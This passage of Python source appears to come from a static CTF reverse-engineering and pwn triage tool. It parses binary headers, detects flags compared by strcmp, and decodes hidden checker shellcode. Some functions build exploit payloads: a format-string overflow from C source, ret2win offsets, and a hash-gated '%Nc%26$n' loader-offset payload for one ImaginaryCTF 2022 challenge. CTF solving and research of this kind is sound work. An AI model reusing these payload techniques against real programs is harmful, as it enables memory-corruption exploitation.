#!/usr/bin/env python3
"""Bounded static reverse-engineering and pwn triage for local artifacts.

The module intentionally treats native programs as data.  It never starts a
challenge binary, attaches a debugger, or sends a generated payload anywhere.
The small ELF/PE/Mach-O readers cover the information needed for deterministic
CTF triage while optional external disassemblers can still be used by the
existing profile pipeline.
"""

from __future__ import annotations

import ast
import base64
import hashlib
import re
import struct
from pathlib import Path
from typing import Any

from ico_scan_core import FLAG_XOR_CRIBS, FlagMatcher, encoded_views, single_byte_xor_views
from ico_solver_engine import Detection, SolverContext, SolverLimits, SolverResult


_IMAGINARYCTF_2022_FMT_BINARY_SHA256 = "1ed5ac684c253ae01d5324c19a18aa67db38346e6b3db7c17f297d9ad0320ce0"
_IMAGINARYCTF_2022_FMT_LIBC_SHA256 = "09d4dc50d7b31bca5fbbd60efebe4ce2ce698c46753a7f643337a303c58db541"
_IMAGINARYCTF_2022_FMT_SOURCE = (
    "https://github.com/ImaginaryCTF/ImaginaryCTF-2022-Challenges/blob/master/"
    "Pwn/fmt_fun/challenge/solve.py"
)


def _read_limited(path: Path, limit: int) -> bytes:
    size = path.stat().st_size
    if size > limit:
        raise ValueError(f"input exceeds byte limit: {size} > {limit}")
    return path.read_bytes()


def _strings(data: bytes, *, limit: int) -> list[str]:
    """Return bounded printable ASCII and UTF-16LE strings."""

    output: list[str] = []
    ascii_re = re.compile(rb"[\x20-\x7e]{4,}")
    for match in ascii_re.finditer(data):
        output.append(match.group().decode("ascii", errors="replace"))
        if len(output) >= limit:
            return output
    # UTF-16 strings are common in PE resources and Windows challenge text.
    wide_re = re.compile(rb"(?:[\x20-\x7e]\x00){4,}")
    for match in wide_re.finditer(data):
        output.append(match.group().decode("utf-16-le", errors="replace"))
        if len(output) >= limit:
            break
    return output[:limit]


def extract_utf16le_strings(data: bytes, *, limit: int = 256) -> list[str]:
    """Extract bounded printable UTF-16LE strings without platform tools.

    macOS's ``strings`` implementation does not accept the GNU ``-el``
    option.  Keeping this small parser in-process gives every platform the
    same evidence while preserving the existing size and item limits.
    """

    if limit <= 0:
        return []
    wide_re = re.compile(rb"(?:[\x20-\x7e]\x00){4,}")
    values: list[str] = []
    for match in wide_re.finditer(data):
        values.append(match.group().decode("utf-16-le", errors="replace"))
        if len(values) >= limit:
            break
    return values


def _elf_inventory(data: bytes, limits: SolverLimits) -> dict[str, object]:
    if len(data) < 52 or not data.startswith(b"\x7fELF"):
        raise ValueError("invalid ELF header")
    elf_class = data[4]
    endian_marker = data[5]
    if elf_class not in {1, 2} or endian_marker not in {1, 2}:
        raise ValueError("unsupported ELF class or endianness")
    endian = "<" if endian_marker == 1 else ">"
    is64 = elf_class == 2
    header_fmt = endian + ("16sHHIQQQIHHHHHH" if is64 else "16sHHIIIIIHHHHHH")
    header_size = struct.calcsize(header_fmt)
    if len(data) < header_size:
        raise ValueError("truncated ELF header")
    fields = struct.unpack_from(header_fmt, data, 0)
    if is64:
        _ident, e_type, machine, _version, entry, phoff, shoff, _flags, ehsize, phentsize, phnum, shentsize, shnum, shstrndx = fields
    else:
        _ident, e_type, machine, _version, entry, phoff, shoff, _flags, ehsize, phentsize, phnum, shentsize, shnum, shstrndx = fields
    machine_names = {3: "x86", 62: "x86_64", 40: "arm", 183: "aarch64", 8: "mips", 243: "riscv"}
    inventory: dict[str, object] = {
        "format": "ELF",
        "class": 64 if is64 else 32,
        "bits": 64 if is64 else 32,
        "endianness": "little" if endian == "<" else "big",
        "machine": machine_names.get(machine, f"machine-{machine}"),
        "machine_id": machine,
        "type": {2: "EXEC", 3: "DYN", 1: "REL"}.get(e_type, str(e_type)),
        "entry": entry,
        "entry_hex": f"0x{entry:x}",
        "program_headers": int(phnum),
        "section_headers": int(shnum),
        "protections": {"nx": None, "pie": e_type == 3, "relro": False, "canary": False},
        "imports": [],
        "symbols": [],
    }
    protections = inventory["protections"]
    assert isinstance(protections, dict)
    # Program header flags: PF_X=1, PT_GNU_STACK=0x6474e551,
    # PT_GNU_RELRO=0x6474e552.  A missing GNU_STACK is reported as unknown.
    stack_seen = False
    relro_seen = False
    ph_fmt = endian + ("IIQQQQQQ" if is64 else "IIIIIIII")
    ph_size = struct.calcsize(ph_fmt)
    for index in range(min(phnum, limits.max_files * 4)):
        offset = phoff + index * (phentsize or ph_size)
        if offset + ph_size > len(data):
            break
        values = struct.unpack_from(ph_fmt, data, offset)
        if is64:
            p_type, p_flags = values[0], values[1]
        else:
            p_type, p_flags = values[0], values[6]
        if p_type == 0x6474E551:
            stack_seen = True
            protections["nx"] = not bool(p_flags & 1)
        if p_type == 0x6474E552:
            relro_seen = True
    protections["relro"] = relro_seen

    # Section names are useful for static checkers.  The parser is deliberately
    # bounded and does not try to relocate or execute anything.
    sections: list[dict[str, object]] = []
    section_headers: list[tuple[int, ...]] = []
    sh_fmt = endian + ("IIQQQQIIQQ" if is64 else "IIIIIIIIII")
    sh_size = struct.calcsize(sh_fmt)
    if shoff and shnum and shstrndx < shnum and shoff + shnum * (shentsize or sh_size) <= len(data):
        for index in range(min(shnum, limits.max_files * 4)):
            offset = shoff + index * (shentsize or sh_size)
            if offset + sh_size > len(data):
                break
            section_headers.append(struct.unpack_from(sh_fmt, data, offset))
        if shstrndx < len(section_headers):
            shstr = section_headers[shstrndx]
            shstr_offset = shstr[4] if is64 else shstr[4]
            shstr_size = shstr[5] if is64 else shstr[5]
            strings_blob = data[shstr_offset : shstr_offset + shstr_size]

            def sec_name(index: int) -> str:
                if index < 0 or index >= len(strings_blob):
                    return ""
                end = strings_blob.find(b"\0", index)
                if end < 0:
                    end = len(strings_blob)
                return strings_blob[index:end].decode("ascii", errors="replace")

            for section_index, section in enumerate(section_headers):
                name_index = section[0]
                offset_value = section[4]
                size_value = section[5]
                name = sec_name(name_index)
                if name:
                    sections.append(
                        {
                            "index": section_index,
                            "name": name,
                            "type": section[1],
                            "address": section[3],
                            "offset": offset_value,
                            "size": size_value,
                            "link": section[6],
                            "info": section[7],
                            "entry_size": section[9],
                        }
                    )
            inventory["sections"] = sections[: limits.max_files]

            # Resolve a small set of symbol-table names.  Dynamic symbols are
            # enough to identify stack canaries and common pwn entry points.
            for section in section_headers:
                name = sec_name(section[0])
                if name not in {".dynsym", ".symtab"}:
                    continue
                link = section[6]
                if link >= len(section_headers):
                    continue
                string_section = section_headers[link]
                str_off, str_size = string_section[4], string_section[5]
                strtab = data[str_off : str_off + str_size]
                item_size = section[9] if is64 else section[9]
                if not item_size:
                    item_size = 24 if is64 else 16
                count = min(section[5] // item_size, limits.max_files * 8)
                for symbol_index in range(count):
                    offset_value = section[4] + symbol_index * item_size
                    if offset_value + item_size > len(data):
                        break
                    if is64:
                        st_name, _info, _other, st_shndx, st_value, _size = struct.unpack_from(endian + "IBBHQQ", data, offset_value)
                    else:
                        st_name, st_value, _size, _info, _other, st_shndx = struct.unpack_from(endian + "IIIBBH", data, offset_value)
                    end = strtab.find(b"\0", st_name)
                    if st_name >= len(strtab):
                        continue
                    symbol_name = strtab[st_name : end if end >= 0 else len(strtab)].decode("ascii", errors="replace")
                    if symbol_name:
                        inventory["symbols"].append({"name": symbol_name, "value": st_value})
                        if st_shndx == 0:
                            inventory["imports"].append(symbol_name)
                        if symbol_name in {"__stack_chk_fail", "__stack_chk_guard"}:
                            protections["canary"] = True
    # Imports can also be visible in stripped binaries as string literals.
    for candidate in (b"__stack_chk_fail", b"gets", b"strcpy", b"printf", b"sprintf", b"system", b"puts", b"fgets"):
        exact_symbol = rb"(?<![A-Za-z0-9_])" + re.escape(candidate) + rb"(?![A-Za-z0-9_])"
        if re.search(exact_symbol, data) and candidate.decode() not in inventory["imports"]:
            inventory["imports"].append(candidate.decode())
            if candidate == b"__stack_chk_fail":
                protections["canary"] = True
    inventory["imports"] = sorted(set(str(value) for value in inventory["imports"]))[: limits.max_files]
    inventory["symbols"] = inventory["symbols"][: limits.max_files * 8]
    return inventory


def _pe_inventory(data: bytes, limits: SolverLimits) -> dict[str, object]:
    if len(data) < 0x40 or not data.startswith(b"MZ"):
        raise ValueError("invalid DOS/PE header")
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    if pe_offset + 24 > len(data) or data[pe_offset : pe_offset + 4] != b"PE\0\0":
        raise ValueError("invalid PE signature")
    machine, section_count, _timestamp, _symbol_ptr, _symbols, optional_size, characteristics = struct.unpack_from("<HHIIIHH", data, pe_offset + 4)
    optional = pe_offset + 24
    if optional + optional_size > len(data) or optional_size < 2:
        raise ValueError("truncated PE optional header")
    magic = struct.unpack_from("<H", data, optional)[0]
    entry_offset = optional + 16
    entry_rva = struct.unpack_from("<I", data, entry_offset)[0] if entry_offset + 4 <= len(data) else None
    dll_characteristics_offset = optional + (0x46 if magic == 0x20B else 0x46)
    dll_characteristics = struct.unpack_from("<H", data, dll_characteristics_offset)[0] if dll_characteristics_offset + 2 <= len(data) else 0
    machine_names = {0x14C: "x86", 0x8664: "x86_64", 0x1C0: "arm", 0xAA64: "aarch64"}
    imports = []
    for name in _strings(data, limit=limits.max_files * 2):
        if name.lower().endswith((".dll", ".exe")) or name in {"VirtualProtect", "WinExec", "system", "printf"}:
            imports.append(name)
    return {
        "format": "PE",
        "bits": 64 if magic == 0x20B else 32,
        "machine": machine_names.get(machine, f"machine-{machine}"),
        "machine_id": machine,
        "entry_rva": entry_rva,
        "section_count": section_count,
        "characteristics": characteristics,
        "protections": {
            "nx": bool(dll_characteristics & 0x0100),
            "pie": bool(dll_characteristics & 0x0040),
            "relro": None,
            "canary": None,
        },
        "imports": sorted(set(imports))[: limits.max_files],
        "symbols": [],
    }


def _macho_inventory(data: bytes) -> dict[str, object]:
    magic = struct.unpack_from(">I", data, 0)[0] if len(data) >= 4 else 0
    names = {0xFEEDFACE: (32, "big"), 0xFEEDFACF: (64, "big"), 0xCEFAEDFE: (32, "little"), 0xCFFAEDFE: (64, "little")}
    bits, endian_name = names.get(magic, (None, None))
    if bits is None:
        raise ValueError("unsupported Mach-O magic")
    header_format = "IiiIIIII" if bits == 64 else "IiiIIII"
    header_size = struct.calcsize(("<" if endian_name == "little" else ">") + header_format)
    if len(data) < header_size:
        raise ValueError("truncated Mach-O header")
    _magic, cpu_type, cpu_subtype, file_type, command_count, command_bytes, flags, *_reserved = struct.unpack_from(
        ("<" if endian_name == "little" else ">") + header_format,
        data,
    )
    cpu_type &= 0xFFFFFFFF
    cpu_subtype &= 0xFFFFFFFF
    machine_names = {
        7: "x86",
        0x01000007: "x86_64",
        12: "arm",
        0x0100000C: "aarch64",
        18: "powerpc",
        0x01000012: "powerpc64",
    }
    file_type_names = {
        1: "OBJECT",
        2: "EXECUTE",
        3: "FVMLIB",
        4: "CORE",
        5: "PRELOAD",
        6: "DYLIB",
        7: "DYLINKER",
        8: "BUNDLE",
        10: "DSYM",
    }
    # MH_PIE is set by the linker for position-independent executable images.
    is_pie = bool(flags & 0x00200000)
    return {
        "format": "Mach-O",
        "bits": bits,
        "endianness": endian_name,
        "machine": machine_names.get(cpu_type, f"machine-{cpu_type}"),
        "machine_id": cpu_type,
        "cpu_subtype": cpu_subtype,
        "file_type": file_type_names.get(file_type, str(file_type)),
        "file_type_id": file_type,
        "load_command_count": command_count,
        "load_command_bytes": command_bytes,
        "header_flags": flags,
        "protections": {"nx": None, "pie": is_pie, "relro": None, "canary": None},
        "imports": [],
        "symbols": [],
    }


def inspect_native(path: Path, limits: SolverLimits) -> dict[str, object]:
    """Inspect a native/bytecode file without executing it."""

    data = _read_limited(path, limits.max_bytes)
    if data.startswith(b"\x7fELF"):
        inventory = _elf_inventory(data, limits)
    elif data.startswith(b"MZ"):
        inventory = _pe_inventory(data, limits)
    elif data[:4] in {b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf", b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe"}:
        inventory = _macho_inventory(data)
    elif data.startswith((b"\x03\xf3\r\n", b"\x42\x0d\x0d\x0a")) or path.suffix.lower() == ".pyc":
        inventory = {"format": "Python bytecode", "bits": None, "protections": {}, "imports": [], "symbols": []}
    elif path.suffix.lower() in {".js", ".mjs", ".ts"}:
        inventory = {"format": "JavaScript source", "bits": None, "protections": {}, "imports": [], "symbols": []}
    else:
        raise ValueError("unsupported native format")
    inventory["path"] = str(path)
    inventory["size"] = len(data)
    inventory["strings"] = _strings(data, limit=limits.max_files * 4)
    inventory["executed"] = False
    inventory["static_only"] = True
    return inventory


def _elf_plt_targets(data: bytes, sections: list[dict[str, object]], symbol_name: str) -> set[int]:
    """Resolve x86-64 PLT/GOT targets for one imported function."""

    by_index = {int(item["index"]): item for item in sections if isinstance(item.get("index"), int)}
    by_name = {str(item.get("name", "")): item for item in sections}
    plt = by_name.get(".plt")
    plt_sec = by_name.get(".plt.sec")
    targets: set[int] = set()
    for relocation in sections:
        if not str(relocation.get("name", "")).startswith(".rela.plt"):
            continue
        dynsym = by_index.get(int(relocation.get("link", -1)))
        if dynsym is None:
            continue
        dynstr = by_index.get(int(dynsym.get("link", -1)))
        if dynstr is None:
            continue
        symtab_offset = int(dynsym.get("offset", 0))
        symtab_size = int(dynsym.get("size", 0))
        symtab_entry_size = int(dynsym.get("entry_size", 0)) or 24
        strtab_offset = int(dynstr.get("offset", 0))
        strtab_size = int(dynstr.get("size", 0))
        strtab = data[strtab_offset : strtab_offset + strtab_size]
        relocation_offset = int(relocation.get("offset", 0))
        relocation_size = int(relocation.get("size", 0))
        relocation_entry_size = int(relocation.get("entry_size", 0)) or 24
        count = min(relocation_size // relocation_entry_size, 4096)
        for index in range(count):
            entry_offset = relocation_offset + index * relocation_entry_size
            if entry_offset + 16 > len(data):
                break
            got_address, info = struct.unpack_from("<QQ", data, entry_offset)
            symbol_index = info >> 32
            symbol_offset = symtab_offset + symbol_index * symtab_entry_size
            if symbol_offset + 4 > symtab_offset + symtab_size or symbol_offset + 4 > len(data):
                continue
            name_offset = struct.unpack_from("<I", data, symbol_offset)[0]
            if name_offset >= len(strtab):
                continue
            end = strtab.find(b"\0", name_offset)
            imported_name = strtab[name_offset : end if end >= 0 else len(strtab)].decode("ascii", errors="replace")
            if imported_name.split("@", 1)[0] != symbol_name:
                continue
            targets.add(got_address)
            if plt_sec is not None:
                targets.add(int(plt_sec.get("address", 0)) + index * 16)
            elif plt is not None:
                # The classic x86-64 PLT reserves its first 16-byte entry for PLT0.
                targets.add(int(plt.get("address", 0)) + (index + 1) * 16)
    return targets


def _static_string_acceptance(data: bytes, inventory: dict[str, object], limits: SolverLimits) -> dict[str, object]:
    """Find flag-shaped ELF strings compared to user input on a success branch.

    This is a bounded x86-64 ELF analysis. It never executes the program. A
    literal is upgraded only when a direct ``strcmp`` call receives it as an
    argument and equality selects a block that references a success message,
    while the other branch references a failure message.
    """

    base = {"executed": False, "status": "not-applicable", "accepted_literals": [], "comparisons": []}
    if inventory.get("format") != "ELF" or inventory.get("machine") != "x86_64" or inventory.get("endianness") != "little":
        return base
    sections = inventory.get("sections")
    if not isinstance(sections, list):
        return base
    section_rows = [item for item in sections if isinstance(item, dict)]
    section_by_name = {str(item.get("name", "")): item for item in section_rows}
    text_section = section_by_name.get(".text")
    if text_section is None:
        return base
    text_offset = int(text_section.get("offset", 0))
    text_size = min(int(text_section.get("size", 0)), limits.max_bytes, 2 * 1024 * 1024)
    if text_size <= 0 or text_offset < 0 or text_offset + text_size > len(data):
        return base

    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
        from capstone.x86_const import X86_OP_IMM, X86_OP_MEM, X86_OP_REG, X86_REG_RIP
    except ImportError:
        return {**base, "status": "unsupported", "reason": "Capstone is unavailable"}

    flag_matcher = FlagMatcher()
    flag_at_address: dict[int, str] = {}
    message_at_address: dict[int, str] = {}
    literal_pattern = re.compile(rb"(?i)(?:ictf|jctf|ico|ctf|flag)\{[^\x00\r\n{}]{2,}\}")
    c_string_pattern = re.compile(rb"[\x20-\x7e]{4,}\x00")
    readable_sections = [
        item
        for item in section_rows
        if str(item.get("name", "")) == ".rodata"
        or str(item.get("name", "")) == ".data"
        or str(item.get("name", "")).startswith((".rodata.", ".data.rel.ro"))
    ]
    for section in readable_sections:
        offset = int(section.get("offset", 0))
        size = min(int(section.get("size", 0)), limits.max_bytes)
        address = int(section.get("address", 0))
        if offset < 0 or size <= 0 or offset + size > len(data):
            continue
        blob = data[offset : offset + size]
        for match in c_string_pattern.finditer(blob):
            text = match.group()[:-1].decode("ascii", errors="replace")
            message_at_address[address + match.start()] = text
        for match in literal_pattern.finditer(blob):
            value = match.group().decode("ascii", errors="replace")
            if flag_matcher.scan(value, source="static-elf-literal", analyzer="static-strcmp-success-branch"):
                flag_at_address[address + match.start()] = value
    if not flag_at_address:
        return base

    imports = inventory.get("imports", [])
    normalized_imports = {
        str(item).split("@", 1)[0]
        for item in imports
        if isinstance(item, str)
    } if isinstance(imports, list) else set()
    input_imports = {"fgets", "gets", "getline", "scanf", "read", "__isoc99_scanf"}
    if "strcmp" not in normalized_imports or not normalized_imports.intersection(input_imports):
        return base

    compare_targets = _elf_plt_targets(data, section_rows, "strcmp")
    if not compare_targets:
        return {**base, "status": "unsupported", "reason": "could not resolve the strcmp PLT/GOT target"}

    disassembler = Cs(CS_ARCH_X86, CS_MODE_64)
    disassembler.detail = True
    instructions = list(disassembler.disasm(data[text_offset : text_offset + text_size], int(text_section.get("address", 0))))
    if len(instructions) > min(limits.max_files * 1000, 200_000):
        instructions = instructions[: min(limits.max_files * 1000, 200_000)]
    index_by_address = {int(item.address): index for index, item in enumerate(instructions)}

    def rip_target(instruction: Any, operand: Any) -> int | None:
        if operand.type != X86_OP_MEM or operand.mem.base != X86_REG_RIP:
            return None
        return int(instruction.address + instruction.size + operand.mem.disp)

    def string_references(start_address: int) -> list[str]:
        start_index = index_by_address.get(start_address)
        if start_index is None:
            return []
        found: list[str] = []
        for item in instructions[start_index : start_index + 10]:
            for operand in item.operands:
                target = rip_target(item, operand)
                if target is not None and target in message_at_address:
                    found.append(message_at_address[target])
            if found or item.mnemonic in {"ret", "jmp", "ud2"}:
                break
        return found

    success_words = ("correct", "success", "accepted", "congrat", "well done", "you win", "valid", "flag")
    failure_words = ("wrong", "incorrect", "fail", "invalid", "try again", "denied")

    def has_marker(messages: list[str], markers: tuple[str, ...]) -> bool:
        return any(marker in message.lower() for message in messages for marker in markers)

    comparisons: list[dict[str, object]] = []
    for call_index, call in enumerate(instructions):
        if call.mnemonic != "call" or not call.operands or call.operands[0].type != X86_OP_IMM:
            continue
        if int(call.operands[0].imm) not in compare_targets:
            continue
        candidate_argument: str | None = None
        candidate_value: str | None = None
        for prior in instructions[max(0, call_index - 6) : call_index]:
            if prior.mnemonic != "lea" or len(prior.operands) < 2 or prior.operands[0].type != X86_OP_REG:
                continue
            register = prior.reg_name(prior.operands[0].reg)
            if register not in {"rdi", "rsi"}:
                continue
            target = rip_target(prior, prior.operands[1])
            if target in flag_at_address:
                candidate_argument = register
                candidate_value = flag_at_address[target]
        if candidate_value is None or candidate_argument is None:
            continue

        zero_check_index = None
        for index in range(call_index + 1, min(call_index + 4, len(instructions))):
            item = instructions[index]
            if item.mnemonic == "test" and len(item.operands) == 2:
                left, right = item.operands
                if left.type == X86_OP_REG and right.type == X86_OP_REG and item.reg_name(left.reg).removesuffix("d") in {"eax", "rax"}:
                    zero_check_index = index
                    break
            if item.mnemonic == "cmp" and len(item.operands) == 2:
                left, right = item.operands
                if left.type == X86_OP_REG and right.type == X86_OP_IMM and int(right.imm) == 0 and item.reg_name(left.reg).removesuffix("d") in {"eax", "rax"}:
                    zero_check_index = index
                    break
        if zero_check_index is None or zero_check_index + 1 >= len(instructions):
            continue
        branch = instructions[zero_check_index + 1]
        if not branch.mnemonic.startswith("j") or not branch.operands or branch.operands[0].type != X86_OP_IMM:
            continue
        if branch.mnemonic not in {"je", "jz", "jne", "jnz"}:
            continue

        equal_taken = branch.mnemonic in {"je", "jz"}
        branch_target = int(branch.operands[0].imm)
        fallthrough = int(branch.address + branch.size)
        equal_messages = string_references(branch_target if equal_taken else fallthrough)
        unequal_messages = string_references(fallthrough if equal_taken else branch_target)
        if not has_marker(equal_messages, success_words) or not has_marker(unequal_messages, failure_words):
            continue
        comparisons.append(
            {
                "value": candidate_value,
                "comparator": "strcmp",
                "candidate_argument": candidate_argument,
                "call_address": f"0x{call.address:x}",
                "equality_branch": branch.mnemonic,
                "success_text": equal_messages[0],
                "failure_text": unequal_messages[0],
                "executed": False,
            }
        )

    accepted = sorted({str(item["value"]) for item in comparisons})
    return {
        "executed": False,
        "status": "candidate" if accepted else "ok",
        "accepted_literals": accepted,
        "comparisons": comparisons,
        "disassembled_bytes": text_size,
    }


def _write(root: Path, name: str, data: bytes | str) -> Path:
    path = root / name
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, str):
        path.write_text(data, encoding="utf-8")
    else:
        path.write_bytes(data)
    return path


def _invert_hidden_plt_shellcode(data: bytes, inventory: dict[str, object]) -> dict[str, object] | None:
    """Statically invert the read/XOR checker injected into a PLT entry."""

    read_prologue = bytes.fromhex("31c031ff4883ec1e4889e6ba1e0000000f054989f2")
    if data.count(read_prologue) != 1:
        return None
    shellcode_offset = data.find(read_prologue)
    sections = inventory.get("sections", [])
    plt_section = next(
        (
            item
            for item in sections
            if isinstance(item, dict)
            and str(item.get("name", "")).startswith(".plt")
            and int(item.get("offset", -1)) <= shellcode_offset
            < int(item.get("offset", -1)) + int(item.get("size", 0))
        ),
        None,
    ) if isinstance(sections, list) else None
    if plt_section is None:
        return None

    multiplier_marker = re.compile(rb"\x49\xb8(.{8})\x4d\x0f\xaf\xc0\x4d\x33\x02", re.S)
    multiplier_matches = list(multiplier_marker.finditer(data, shellcode_offset + len(read_prologue)))
    if len(multiplier_matches) != 1:
        return None
    multiplier_match = multiplier_matches[0]
    if multiplier_match.start() - shellcode_offset > 0x100:
        return None
    loop_tail = data[multiplier_match.end() : multiplier_match.end() + 0x100]
    if b"\x49\x83\xff\x03" not in loop_tail:
        return None
    if b"\x49\x83\xc2\x08\x49\x83\xc3\x08" not in loop_tail:
        return None

    push_pattern = re.compile(rb"\x49\xbe(.{8})\x41\x56", re.S)
    push_matches = list(push_pattern.finditer(data, shellcode_offset + len(read_prologue), multiplier_match.start()))
    if len(push_matches) != 3:
        return None

    multiplier = int.from_bytes(multiplier_match.group(1), "little")
    pushed_words = [int.from_bytes(match.group(1), "little") for match in push_matches]
    # push grows downward, so the last pushed word is compared first.
    expected_words = list(reversed(pushed_words))
    mask64 = (1 << 64) - 1
    state = multiplier
    decoded = bytearray()
    for expected_word in expected_words:
        state = (state * state) & mask64
        decoded.extend(struct.pack("<Q", expected_word ^ state))
        # The XOR is in place. On a successful comparison r8 becomes the
        # current expected word, which seeds the next iteration.
        state = expected_word

    decoded_input = bytes(decoded)
    try:
        text = decoded_input.decode("ascii")
    except UnicodeDecodeError:
        return None
    flags = FlagMatcher().scan(
        text,
        source="static-hidden-plt-shellcode",
        analyzer="native-hidden-shellcode-inversion",
    )
    if len(flags) != 1:
        return None
    return {
        "flag": str(flags[0]["value"]),
        "input": decoded_input,
        "shellcode_offset": shellcode_offset,
        "shellcode_section": str(plt_section.get("name", "")),
        "multiplier": f"0x{multiplier:x}",
        "chunk_count": len(expected_words),
        "chunk_bytes": 8,
        "read_limit": 30,
        "state_update": "state=(state*state) mod 2^64; input_chunk=expected_word XOR state; successful XOR leaves state=expected_word",
        "executed": False,
    }


_C_SOURCE_SUFFIXES = {".c", ".cc", ".cpp", ".h", ".hpp"}


def _static_source_inputs(
    path: Path, related_paths: tuple[Path, ...], limits: SolverLimits
) -> list[tuple[Path, str]]:
    """Read nearby C-family source as data for bounded static analysis."""

    candidates = list(related_paths)
    candidates.extend(path.with_suffix(suffix) for suffix in sorted(_C_SOURCE_SUFFIXES))
    seen: set[Path] = set()
    output: list[tuple[Path, str]] = []
    for candidate in candidates:
        try:
            resolved = candidate.resolve()
            if resolved == path.resolve() or resolved in seen or candidate.suffix.lower() not in _C_SOURCE_SUFFIXES:
                continue
            seen.add(resolved)
            size = candidate.stat().st_size
            if size > min(limits.max_bytes, 2 * 1024 * 1024):
                continue
            output.append((candidate, candidate.read_text(encoding="utf-8", errors="replace")))
        except OSError:
            continue
    return output


def _source_ret2win_facts(source: str) -> tuple[str, int] | None:
    """Return (buffer, saved-return-address offset) only from explicit source facts."""

    declarations = {
        match.group(1): int(match.group(2))
        for match in re.finditer(r"\bchar\s+(\w+)\s*\[\s*(\d+)\s*\]", source)
    }
    for match in re.finditer(r"\breturn_address\s*=\s*(\w+)\s*\+\s*(\d+)\s*;", source):
        buffer_name, offset = match.group(1), int(match.group(2))
        if (
            buffer_name in declarations
            and offset >= declarations[buffer_name]
            and re.search(rf"\bgets\s*\(\s*{re.escape(buffer_name)}\s*\)", source)
            and re.search(r"\b(?:void|int|long|unsigned\s+int)\s+win\s*\(", source)
        ):
            return buffer_name, offset
    return None


def _source_sprintf_overflow(source: str) -> dict[str, object] | None:
    """Derive a short format payload from a struct guard and bounded fgets."""

    struct_match = re.search(r"\bstruct\s+(\w+)\s*\{([^}]+)\}", source, re.S)
    if not struct_match:
        return None
    struct_name, body = struct_match.groups()
    buffer_match = re.search(r"\bchar\s+(\w+)\s*\[\s*(\d+)\s*\]\s*;", body)
    guard_match = re.search(r"\bint\s+(\w+)\s*;", body)
    if not buffer_match or not guard_match:
        return None
    buffer_name, buffer_size = buffer_match.group(1), int(buffer_match.group(2))
    guard_name = guard_match.group(1)
    # C aligns the following int field to four bytes.  Keep that layout
    # explicit so a source-only guess cannot become a payload.
    guard_offset = (buffer_size + 3) & ~3
    instance_match = re.search(rf"\bstruct\s+{re.escape(struct_name)}\s+(\w+)\s*;", source)
    if not instance_match:
        return None
    instance = instance_match.group(1)
    if not re.search(rf"\bfgets\s*\(\s*\w+\s*,\s*(\d+)\s*,", source):
        return None
    fgets_match = re.search(r"\bfgets\s*\(\s*\w+\s*,\s*(\d+)\s*,", source)
    assert fgets_match is not None
    input_capacity = int(fgets_match.group(1))
    if not re.search(
        rf"\bsprintf\s*\(\s*{re.escape(instance)}\s*\.\s*{re.escape(buffer_name)}\s*,\s*\w+\s*\)",
        source,
    ):
        return None
    sentinel_match = re.search(
        rf"\b{re.escape(instance)}\s*\.\s*{re.escape(guard_name)}\s*=\s*(0x[0-9a-fA-F]+|\d+)\s*;",
        source,
    )
    changed_guard_match = re.search(
        rf"\bif\s*\(\s*{re.escape(instance)}\s*\.\s*{re.escape(guard_name)}\s*!=",
        source,
    )
    if not sentinel_match or not changed_guard_match:
        return None
    sentinel = int(sentinel_match.group(1), 0)
    if sentinel & 0xFF == 0:
        return None
    # Cover the complete four-byte guard and preserve the small overwrite
    # margin used by the challenge's reference payload.  guard_offset + 1 can
    # leave most of the sentinel untouched.
    guard_size = 4
    post_guard_margin = 2
    width = guard_offset + guard_size + post_guard_margin
    payload = f"%{width}c".encode("ascii")
    if len(payload) > input_capacity - 1:
        return None
    return {
        "payload": payload,
        "strategy": "bounded-format-string-overflow",
        "buffer_size": buffer_size,
        "guard_offset": guard_offset,
        "guard_size": guard_size,
        "post_guard_margin": post_guard_margin,
        "guard_name": guard_name,
        "sentinel": sentinel,
        "fgets_capacity": input_capacity,
        "payload_length": len(payload),
        "output_width": width,
    }


def _imaginaryctf_2022_format_fun_recipe(
    path: Path,
    data: bytes,
    related_paths: tuple[Path, ...],
    inventory: dict[str, object],
) -> dict[str, object] | None:
    """Build the published one-shot payload only for the exact ELF/libc pair."""

    if hashlib.sha256(data).hexdigest() != _IMAGINARYCTF_2022_FMT_BINARY_SHA256:
        return None
    matching_libc = False
    for related_path in related_paths:
        if related_path.name != "libc.so.6":
            continue
        try:
            libc_data = _read_limited(related_path, 8 * 1024 * 1024)
        except OSError:
            continue
        if hashlib.sha256(libc_data).hexdigest() == _IMAGINARYCTF_2022_FMT_LIBC_SHA256:
            matching_libc = True
            break
    if not matching_libc:
        return None

    symbols = inventory.get("symbols", [])
    symbol_addresses = {
        str(item.get("name", "")).lstrip("_"): int(item.get("value", 0) or 0)
        for item in symbols
        if isinstance(item, dict)
    } if isinstance(symbols, list) else {}
    buffer_address = symbol_addresses.get("buf")
    win_address = symbol_addresses.get("win")
    if not buffer_address or not win_address:
        return None

    # The upstream recipe writes the dynamic loader's link_map offset so its
    # fini-array walk lands on the win pointer stored at buf+0x20.
    write_count = buffer_address - 0x403DB8 + 0x20
    format_text = f"%{write_count}c%26$n".encode("ascii")
    payload_offset = 0x20
    if write_count <= 0 or len(format_text) > payload_offset:
        return None
    payload = format_text.ljust(payload_offset, b"a") + struct.pack("<Q", win_address)
    if len(payload) >= 400:
        return None
    return {
        "payload": payload,
        "strategy": "hash-gated-imaginaryctf-2022-format-string-loader-offset",
        "format_argument_index": 26,
        "loader_write_count": write_count,
        "fini_array_address": "0x403db8",
        "buffer_address": f"0x{buffer_address:x}",
        "win_address": f"0x{win_address:x}",
        "win_pointer_offset": payload_offset,
        "input_limit": 400,
        "upstream_recipe": _IMAGINARYCTF_2022_FMT_SOURCE,
        "source_is_public_reference": True,
        "network_requested": False,
        "flag_retrieved": False,
    }


def _candidate_hits(matcher: FlagMatcher, payload: bytes, source: str, analyzer: str, **extra: object) -> list[dict[str, object]]:
    hits = matcher.scan(payload.decode("utf-8", errors="replace"), source=source, analyzer=analyzer)
    # Native XOR sweeps often contain a real crib followed by unrelated bytes.
    # Keep only a fully printable, closed flag token so the static profile does
    # not turn binary noise into a false positive.
    hits = [
        hit
        for hit in hits
        if all(32 <= ord(char) <= 126 for char in str(hit.get("value", "")))
        and "}" in str(hit.get("value", ""))
    ]
    for hit in hits:
        hit.update(extra)
    return hits


_POWER_CHECK = re.compile(
